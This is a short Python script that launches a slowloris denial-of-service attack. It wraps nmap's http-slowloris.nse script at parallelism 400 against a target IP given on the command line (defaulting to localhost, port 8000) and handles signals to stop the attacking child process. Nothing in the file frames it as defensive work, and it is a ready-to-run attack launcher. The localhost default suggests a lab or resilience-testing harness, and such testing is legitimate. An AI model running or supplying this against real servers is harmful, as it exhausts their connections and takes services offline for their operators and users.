import signal, subprocess, os, datetime, sys

victims_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"

def start():
    args = ['nmap', '--script', 'http-slowloris.nse', '--max-parallelism', '400', victims_ip, '-p', '8000']
    print(f"[starting DoS main] pid({os.getpid()}) at {datetime.datetime.now()}")
    process = subprocess.Popen(args)
    print(f"[starting DoS children] pid({process.pid}) at {datetime.datetime.now()}")
    def kill_child(signum, frame):
        print(f"[killing DoS children] pid({process.pid}) at {datetime.datetime.now()}")
        process.send_signal(signal.SIGTERM)

    signal.signal(signal.SIGINT, kill_child)
    signal.signal(signal.SIGTERM, kill_child)

    process.wait()
    print(f"[killing DoS main] pid({os.getpid()}) at {datetime.datetime.now()}")
